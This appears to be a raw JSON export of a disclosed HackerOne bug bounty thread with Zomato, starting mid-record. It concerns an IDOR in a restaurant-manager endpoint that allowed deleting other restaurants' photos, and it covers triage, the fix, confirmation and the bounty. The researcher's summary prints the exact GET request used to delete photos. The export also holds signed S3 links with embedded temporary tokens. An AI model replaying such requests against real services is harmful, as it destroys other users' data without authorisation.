photo\n\n████████","markdown_message":"\u003cp\u003eI think I can only delete photos starting with r_ as in posted by restaurant but I\u0026#39;m not entirely sure. I got a success response back so it might take some time to be removed from s3. \u003c/p\u003e\n\n\u003cp\u003eI checked I can only delete something with r_. I can show it with that photo\u003c/p\u003e\n\n\u003cp\u003e████████\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-03T20:05:13.902Z","updated_at":"2018-09-05T16:58:35.910Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3286543,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hence I set it as Low :) Thanks.","markdown_message":"\u003cp\u003eHence I set it as Low :) Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-03T20:07:24.535Z","updated_at":"2018-09-03T20:07:24.535Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3287005,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I see makes sense. I thought being able to target would change severity but I see your point. I should also point out that I tried to delete user uploaded photo with a regular user but got an error saying I can only delete photos uploaded by me so that part is not vulnerable.\n\nThanks for the explanation.","markdown_message":"\u003cp\u003eI see makes sense. I thought being able to target would change severity but I see your point. I should also point out that I tried to delete user uploaded photo with a regular user but got an error saying I can only delete photos uploaded by me so that part is not vulnerable.\u003c/p\u003e\n\n\u003cp\u003eThanks for the explanation.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-03T23:32:43.546Z","updated_at":"2018-09-03T23:32:43.546Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3296291,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @emitrani - This has been fixed. Please check and confirm!\n\nThanks for helping us keep @zomato secure :) \n\nCheers.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/emitrani\"\u003e@emitrani\u003c/a\u003e - This has been fixed. Please check and confirm!\u003c/p\u003e\n\n\u003cp\u003eThanks for helping us keep \u003ca href=\"/zomato\"\u003e@zomato\u003c/a\u003e secure :) \u003c/p\u003e\n\n\u003cp\u003eCheers.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-05T10:39:49.459Z","updated_at":"2018-09-05T10:39:49.459Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"emitrani","url":"/emitrani"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3296377,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update @prateek_0490-zomato,\n\nIs there an image you want me to test this on? When I tried to delete the old picture I already deleted I got a `{\"status\":\"success\"}` response, however that might be because that picture no longer exists.\n\nI'm sure the fix is right but I have no way to confirm it properly.\n\nRegards,\nEray","markdown_message":"\u003cp\u003eThanks for the update \u003ca href=\"/prateek_0490-zomato\"\u003e@prateek_0490-zomato\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIs there an image you want me to test this on? When I tried to delete the old picture I already deleted I got a \u003ccode\u003e{\u0026quot;status\u0026quot;:\u0026quot;success\u0026quot;}\u003c/code\u003e response, however that might be because that picture no longer exists.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m sure the fix is right but I have no way to confirm it properly.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nEray\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-05T11:17:50.569Z","updated_at":"2018-09-05T11:17:50.569Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3296379,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@emitrani - Can you try out on this image - `https://www.zomato.com/█████`","markdown_message":"\u003cp\u003e\u003ca href=\"/emitrani\"\u003e@emitrani\u003c/a\u003e - Can you try out on this image - \u003ccode\u003ehttps://www.zomato.com/█████\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-05T11:19:58.030Z","updated_at":"2018-09-05T16:50:58.263Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3296402,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh Okay I see. I still get the `{\"status\":\"success\"}` response but the photo is no longer deleted.\n\nI confirm the fix but you might want to edit the response string with the new code path. \n\nRegards.\nEray","markdown_message":"\u003cp\u003eOh Okay I see. I still get the \u003ccode\u003e{\u0026quot;status\u0026quot;:\u0026quot;success\u0026quot;}\u003c/code\u003e response but the photo is no longer deleted.\u003c/p\u003e\n\n\u003cp\u003eI confirm the fix but you might want to edit the response string with the new code path. \u003c/p\u003e\n\n\u003cp\u003eRegards.\u003cbr\u003e\nEray\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-05T11:24:10.165Z","updated_at":"2018-09-05T11:24:10.165Z","actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3297166,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I think the POC is pretty funny and tried to summarize the report as best I can since Zomato prefers summary disclosure.\n\nFeel free to accept or deny it.\n\nRegards,\nEray","markdown_message":"\u003cp\u003eI think the POC is pretty funny and tried to summarize the report as best I can since Zomato prefers summary disclosure.\u003c/p\u003e\n\n\u003cp\u003eFeel free to accept or deny it.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nEray\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-05T15:11:33.393Z","updated_at":"2018-09-05T15:11:33.393Z","first_to_agree":true,"actor":{"username":"emitrani","cleared":true,"url":"/emitrani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/181/54e8d7444534dbe32a21bd75c87febb777a18496_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3297661,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-05T16:54:35.857Z","updated_at":"2018-09-05T16:54:35.857Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"300.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"emitrani","url":"/emitrani"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3297697,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-05T17:01:23.680Z","updated_at":"2018-09-05T17:01:23.680Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3297698,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-05T17:01:23.838Z","updated_at":"2018-09-05T17:01:23.838Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10261,"category":"researcher","content":"When I was testing the restaurant manager specific endpoints on Zomato I discovered that pictures added were being deleted with a get request like so:\n\n```\nGET /php/client_manage_handler?res_id=REDACTED\u0026photo_ids%5B%5D=r_YxNDUOTE4MTYzO\u0026removable=1\u0026case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: REDACTED\nConnection: close\n```\n`photo_ids` seemed like a potential IDOR and I found it was possible to find the ID by visiting a restaurants front page. Since I didn't want to delete a photo in production I decided to contact someone who I knew also had access to a manager account to test my intuition. As I had no way of seeing if his private picture was deleted I waited for his response and then submitted my report with the following POC:\n\n{F341857}\n\n@Zomato team promptly verified and fixed the issue and it was a pleasure to work with them for the first time.\n","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eWhen I was testing the restaurant manager specific endpoints on Zomato I discovered that pictures added were being deleted with a get request like so:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /php/client_manage_handler?res_id=REDACTED\u0026amp;photo_ids%5B%5D=r_YxNDUOTE4MTYzO\u0026amp;removable=1\u0026amp;case=remove-active-photo HTTP/1.1\nHost: www.zomato.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.zomato.com/\nX-Requested-With: XMLHttpRequest\nCookie: REDACTED\nConnection: close\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003ephoto_ids\u003c/code\u003e seemed like a potential IDOR and I found it was possible to find the ID by visiting a restaurants front page. Since I didn\u0026#39;t want to delete a photo in production I decided to contact someone who I knew also had access to a manager account to test my intuition. As I had no way of seeing if his private picture was deleted I waited for his response and then submitted my report with the following POC:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"proof.JPG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?response-content-disposition=attachment%3B%20filename%3D%22proof.JPG%22%3B%20filename%2A%3DUTF-8%27%27proof.JPG\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055211Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=372944cb50563efc74827e35f8e6ee3ad23bcd60c3948e81b7d5f15d7e3be671\" data-attachment-type=\"image/jpeg\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/341/857/b4979640c930d4180787b1963665149d0f361784/proof.JPG?response-content-disposition=attachment%3B%20filename%3D%22proof.JPG%22%3B%20filename%2A%3DUTF-8%27%27proof.JPG\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055211Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=372944cb50563efc74827e35f8e6ee3ad23bcd60c3948e81b7d5f15d7e3be671\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/zomato\"\u003e@Zomato\u003c/a\u003e team promptly verified and fixed the issue and it was a pleasure to work with them for the first time.\u003c/p\u003e\n"}]}